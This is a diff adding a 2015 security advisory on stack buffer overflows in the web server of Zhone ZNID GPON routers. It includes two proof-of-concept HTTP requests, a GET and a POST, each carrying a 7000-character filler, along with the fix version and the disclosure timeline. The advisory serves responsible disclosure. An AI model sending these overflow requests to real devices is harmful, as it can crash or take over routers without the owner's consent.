@@ -1,0 +1,80 @@
+Vantage Point Security Advisory 2015-003
+========================================
+
+Title: Multiple Remote Code Execution found in ZHONE
+Vendor: Zhone
+Vendor URL: http://www.zhone.com
+Device Model: ZHONE ZNID GPON 2426A
+(24xx, 24xxA, 42xx, 42xxA, 26xx, and 28xx series models)
+Versions affected: < S3.0.501
+Severity: High
+Vendor notified: Yes
+Reported:
+Public release:
+Author: Lyon Yang <lyon[at]vantagepoint[dot]sg> <lyon.yang.s[at]gmail[dot]com>
+
+Summary:
+--------
+
+ZHONE RGW is vulnerable to stack-based buffer overflow attacks due to
+the use of unsafe string functions without sufficient input validation
+in the httpd binary. Two exploitable conditions were discovered when
+requesting a large (7000) character filename ending in .cgi, .tst,
+.html, .cmd, .conf, .txt and .wl, in GET or POST requests. Vantage
+Point has developed working code execution exploits for these issues.
+
+
+1. Stack Overflow via HTTP GET Request
+---------------------------------------------------------------------------------------
+
+GET /.cmd?AAAA…..AAAA<7000 Characters> HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0)
+Gecko/20100101 Firefox/35.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/zhnvlanadd.html
+Authorization: Basic (Base 64 Encoded:<USER:PASSWORD>)
+Connection: keep-alive
+
+2. Stack Overflow via HTTP POST Request
+---------------------------------------------------------------------------------------
+
+POST /.cgi HTTP/1.1
+Host: 192.168.1.1
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/updatesettings.html
+Authorization: Basic (Base 64 Encoded:<USER:PASSWORD>)
+Content-Length: 88438
+
+AAAA…..AAAA<7000 Characters>
+
+
+Fix Information:
+----------------
+
+Upgrade to version S3.1.241
+
+
+Timeline:
+---------
+2015/04: Issues reported to Zhone
+2015/06: Requested Update
+2015/08: Requested Update
+2015/09: Requested Update
+2015/10: Confirm that all issues has been fixed
+
+
+About Vantage Point Security:
+--------------------
+
+Vantage Point is the leading provider for penetration testing and
+security advisory services in Singapore. Clients in the Financial,
+Banking and Telecommunications industries select Vantage Point
+Security based on technical competency and a proven track record to
+deliver significant and measurable improvements in their security
+posture.
+
+https://www.vantagepoint.sg/
+office[at]vantagepoint[dot]sg
